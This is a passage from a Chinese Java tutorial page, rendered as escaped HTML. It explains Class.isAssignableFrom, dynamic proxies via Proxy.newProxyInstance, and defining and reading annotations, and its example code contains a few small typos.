&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Number&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isAssignableFrom&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// true，因为Integer可以赋值给Number
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Object o = ?
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isAssignableFrom&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// true，因为Integer可以赋值给Object
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Integer i = ?
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isAssignableFrom&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Number&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// false，因为Number不能赋值给Integer
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="动态代理">动态代理&lt;/h3>
&lt;ul>
&lt;li>&lt;code>class&lt;/code>可以实例化而&lt;code>interface&lt;/code>不可以，所有&lt;code>interface&lt;/code>类型的变量总是通过某个实例向上转型并赋值给接口类型变量&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">CharSequence&lt;/span> &lt;span style="color:#111">cs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">StringBuilder&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>静态方式&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 定义接口
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">Hellp&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">morning&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 编写实现类
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">HelloWorld&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Hellp&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">morning&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Good morning, &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 创建实例 转型为接口并调用
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Hello&lt;/span> &lt;span style="color:#111">hello&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HelloWorld&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">hello&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">morning&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Bob&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>动态代理Dynamic Proxy可以在运行期动态创建某个&lt;code>interface&lt;/code>的实例，不编写实现类，直接通过&lt;code>Proxy.newProxyInstance()&lt;/code>创建一个&lt;code>Hello&lt;/code>接口对象&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.InvocationHandler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Method&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Proxy&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InvocationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvocationHandler&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// InvocationHandler实例负责实现接口的方法调用
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">proxy&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Throwable&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;morning&amp;#34;&lt;/span>&lt;span style="color:#f92672">)){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Good mornig, &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Hello&lt;/span> &lt;span style="color:#111">hello&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Hello&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">Proxy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newProxyInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span> &lt;span style="color:#75715e">// 返回的Object强制转型为接口
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Hello&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClassLoader&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#75715e">// 使用的ClassLoader 通常为接口类的ClassLoader
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">Hello&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span> &lt;span style="color:#75715e">// 需要实现的接口数组 至少传入一个接口
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 用来处理接口方法调用的InvocationHandler实例
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">hello&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">morning&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Bob&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">Hello&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">morning&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>动态代理实际上是JVM在运行期动态创建class字节码并加载的过程，上面的改写为静态实现是这样的&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">HelloDynamicProxy&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Hello&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InvationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">HelloDynamicProxy&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InvocationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">morning&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Hello&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;morning&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>只不过JVM直接编写了这个中间的类，不需要源码，可以直接生成字节码&lt;/p>
&lt;h2 id="注解">注解&lt;/h2>
&lt;p>注解Annotation，是放在Java源码的类、方法、字段、参数前的一种特殊注释&lt;/p>
&lt;h3 id="使用定义注解">使用&amp;amp;定义注解&lt;/h3>
&lt;p>注解可分为三类&lt;/p>
&lt;ul>
&lt;li>1 编译器使用的注解：这类注解不会被编译进入&lt;code>.class&lt;/code>文件，它们在编译后就被编译器扔掉了&lt;/li>
&lt;/ul>
&lt;p>&lt;code>@Override&lt;/code>：让编译器检查该方法是否正确地实现了覆写&lt;/p>
&lt;p>&lt;code>@SuppressWarnings&lt;/code>：告诉编译器忽略此处代码产生的警告&lt;/p>
&lt;ul>
&lt;li>2 由工具处理&lt;code>.class&lt;/code>文件使用的注解：有些工具会在加载class的时候，对class做动态修改，实现一些特殊的功能；这类注解会被编译进入&lt;code>.class&lt;/code>文件，但加载结束后并不会存在于内存中&lt;/li>
&lt;li>3 程序运行期可读取的注解：加载后一直存在于JVM中，这也是最常用的注解&lt;/li>
&lt;/ul>
&lt;p>&lt;code>@PostConstruct&lt;/code>：配置了它的方法会在调用构造方法后自动被调用，这是Java代码读取该注解实现的功能，JVM并不会识别该注解&lt;/p>
&lt;ul>
&lt;li>定义一个注解时，还可以定义配置参数，配置参数可以包括：基本类型，String，枚举类，基本类型、String、Class以及枚举的数组；可以设置缺省值，如果只写注解，相当于全部使用默认值&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Hello&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Check&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">min&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">max&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">100&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">55&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Check&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">99&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Check&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">99&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#75715e">// @Check(value=99)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Check&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>@Check&lt;/code>就是一个注解&lt;/p>
&lt;ul>
&lt;li>有一些注解可以修饰其他注解，这些注解就称为元注解Meta annotation&lt;/li>
&lt;/ul>
&lt;p>&lt;code>@Target&lt;/code>：使用&lt;code>@Target&lt;/code>可以定义&lt;code>Annotation&lt;/code>能够被应用于源码的哪些位置&lt;/p>
&lt;pre tabindex="0">&lt;code>类或接口：ElementType.TYPE
字段：ElementType.FIELD
方法：ElementType.METHOD
构造方法：ElementType.CONSTRUCTOR
方法参数：ElementType.PARAMETER
&lt;/code>&lt;/pre>&lt;p>&lt;code>@Retention&lt;/code>：定义了&lt;code>Annotation&lt;/code>的生命周期，通常我们自定义的&lt;code>Annotation&lt;/code>都是&lt;code>RUNTIME&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>仅编译期：RetentionPolicy.SOURCE 编译器被丢掉 一般不用(编译器使用)
仅class文件：RetentionPolicy.CLASS 仅保存在class文件中 不会被加载入JVM(底层工具库使用 涉及class的加载)
运行期：RetentionPolicy.RUNTIME 会被加载进JVM 并在运行期被程序读取(常用)
&lt;/code>&lt;/pre>&lt;p>&lt;code>@Repeatable&lt;/code>：定义&lt;code>Annotation&lt;/code>是否可重复&lt;/p>
&lt;p>&lt;code>@Inherited&lt;/code>：定义子类是否可继承父类定义的&lt;code>Annotatio&lt;/code>，仅针对&lt;code>@Target(ElementType.TYPE)&lt;/code>类型的&lt;code>annotation&lt;/code>有效，并且仅针对&lt;code>class&lt;/code>的继承，对&lt;code>interface&lt;/code>的继承无效&lt;/p>
&lt;ul>
&lt;li>使用&lt;code>@interface&lt;/code>语法来定义注解，用元注释来配置注释，其中&lt;code>@Target&lt;/code>和&lt;code>@Retention&lt;/code>(一般设为RUNTIME)必须设置&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@Target&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ElementType&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">TYPE&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@Retention&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">RetentionPolicy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">RUNTIME&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">@interface&lt;/span> &lt;span style="color:#111">Report&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">default&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">level&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">default&lt;/span> &lt;span style="color:#d88200">&amp;#34;info&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">default&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="处理注解">处理注解&lt;/h3>
&lt;p>注解本身对代码逻辑没有任何影响，如何使用注解完全由工具决定&lt;/p>
&lt;p>注解定义后也是一种&lt;code>class&lt;/code>，所有的注解都继承自&lt;code>java.lang.annotation.Annotation&lt;/code>，所以读取注解需要用到反射&lt;/p>
&lt;p>判断某个注解是否存在于&lt;code>Class&lt;/code>、&lt;code>Field&lt;/code>、&lt;code>Method&lt;/code>或&lt;code>Constructor&lt;/code>：&lt;/p>
&lt;ul>
&lt;li>&lt;code>Class.isAnnotationPresent(Class)&lt;/code>&lt;/li>
&lt;li>&lt;code>Field.isAnnotationPresent(Class)&lt;/code>&lt;/li>
&lt;li>&lt;code>Method.isAnnotationPresent(Class)&lt;/code>&lt;/li>
&lt;li>&lt;code>Constructor.isAnnotationPresent(Class)&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 判断@Report是否存在于Person类:
